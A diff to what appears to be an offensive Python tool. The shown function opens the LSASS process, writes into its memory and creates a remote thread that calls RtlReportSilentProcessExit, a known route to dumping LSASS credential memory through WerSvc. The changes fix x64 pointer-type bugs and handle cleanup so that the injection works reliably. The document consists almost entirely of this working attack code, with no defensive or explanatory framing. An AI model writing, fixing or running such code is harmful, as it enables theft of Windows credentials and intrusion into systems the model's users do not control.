@@ -145,17 +145,29 @@ def trigger_silent_exit_remote(lsass_pid):
     versions including 1809.
     """
     k32 = ctypes.windll.kernel32
-    ntdll = ctypes.windll.ntdll
+
+    # Set up proper return types (critical on x64, otherwise pointers get truncated)
+    k32.LoadLibraryA.restype = ctypes.c_void_p
+    k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
+    k32.GetProcAddress.restype = ctypes.c_void_p
+    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
+    k32.OpenProcess.restype = ctypes.c_void_p
+    k32.OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_bool, ctypes.c_ulong]
+    k32.VirtualAllocEx.restype = ctypes.c_void_p
+    k32.VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
+    k32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+    k32.CreateRemoteThread.restype = ctypes.c_void_p
+    k32.CreateRemoteThread.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
 
     # Get address of RtlReportSilentProcessExit in ntdll
-    ntdll_handle = k32.GetModuleHandleA(b"ntdll.dll")
+    ntdll_handle = k32.LoadLibraryA(b"ntdll.dll")
     if not ntdll_handle:
-        print("[!] Failed to get ntdll handle")
+        print("[!] Failed to load ntdll")
         return False
 
     rtl_addr = k32.GetProcAddress(ntdll_handle, b"RtlReportSilentProcessExit")
     if not rtl_addr:
-        print("[!] RtlReportSilentProcessExit not found in ntdll")
+        print(f"[!] RtlReportSilentProcessExit not found (ntdll @ 0x{ntdll_handle:016X})")
         return False
     print(f"[*] RtlReportSilentProcessExit @ 0x{rtl_addr:016X}")
 
@@ -228,12 +240,14 @@ def trigger_silent_exit_remote(lsass_pid):
     print("[*] LSASS is now the ALPC caller, WerSvc will look up lsass.exe")
 
     # Wait for thread to finish
+    k32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
     k32.WaitForSingleObject(hThread, 10000)
 
     # Cleanup
+    k32.VirtualFreeEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
     k32.VirtualFreeEx(hLsass, remote_buf, 0, MEM_RELEASE)
-    k32.CloseHandle(hThread)
-    k32.CloseHandle(hLsass)
+    k32.CloseHandle(ctypes.c_void_p(hThread))
+    k32.CloseHandle(ctypes.c_void_p(hLsass))
     return True
 
 
